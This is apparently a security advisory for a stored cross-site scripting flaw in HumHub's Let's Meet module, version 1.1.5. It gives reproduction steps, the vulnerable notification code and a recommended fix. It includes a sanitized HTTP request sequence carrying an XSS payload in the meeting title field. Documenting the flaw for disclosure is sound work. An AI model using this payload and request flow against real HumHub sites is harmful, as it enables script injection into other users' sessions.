# HumHub Let's Meet invitation notification stored XSS

## Summary

HumHub Let's Meet 1.1.5 contains stored cross-site scripting in invitation notifications. NewInviteNotification interpolates the meeting title, organizer display name, and space name into raw HTML without encoding. A user permitted to create meetings can inject markup that executes when an invited user opens the notification overview.

## Affected product

- Vendor/project: **HumHub**
- Product: **Let's Meet module**
- Affected version: **1.1.5**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

User permitted to create a meeting and invite the victim; victim opens notifications.

Verified flow: `meeting title / display names → NewInviteNotification::html() → notification overview`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a meeting whose title contains an HTML marker and invite another user.
2. Run the normal notification queue processing path.
3. Open the invited user's notification overview and inspect the rendered notification.

Sanitized request shape used during verification:

```http
# User permitted to create meetings; CSRF/state identifiers redacted
POST <BASE_URL>/s/<SPACE_ID>/lets-meet/index/create
Cookie: <ATTACKER_SESSION_COOKIE>
X-CSRF-Token: <CSRF>
X-Requested-With: XMLHttpRequest

MainForm[title]=<img id=gt481023h5c src=x onerror=self.x=5>
MainForm[description]=gt481023h5c meeting
MainForm[duration]=01:00&MainForm[make_public]=1

POST .../lets-meet/index/dates?hash=<STATE_HASH>
POST .../lets-meet/index/invites?hash=<STATE_HASH>
InvitesForm[invites][]=<VICTIM_GUID>

GET <BASE_URL>/notification/overview
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.


## Confirmed source and Sink

```text
NewInviteNotification.php:48-54
public function html() {
    return Yii::t(..., [
        'organizer' => $this->originator->displayName,
        'meeting' => $this->source->title,
        'space' => $this->source->content->container->name,
    ]);
}
```

Root cause: The notification's HTML translation receives attacker-controlled meeting and display values as trusted substitutions, producing raw notification markup.

## Recommended remediation

HTML-encode every substituted value before building the HTML notification, or render the notification with safe components rather than a translated HTML string.

## References

- Official source: https://github.com/humhub/lets-meet/blob/master/notifications/NewInviteNotification.php

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-18 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-18/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-18 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-18/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-18 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-18/03-source-github-v3.png)
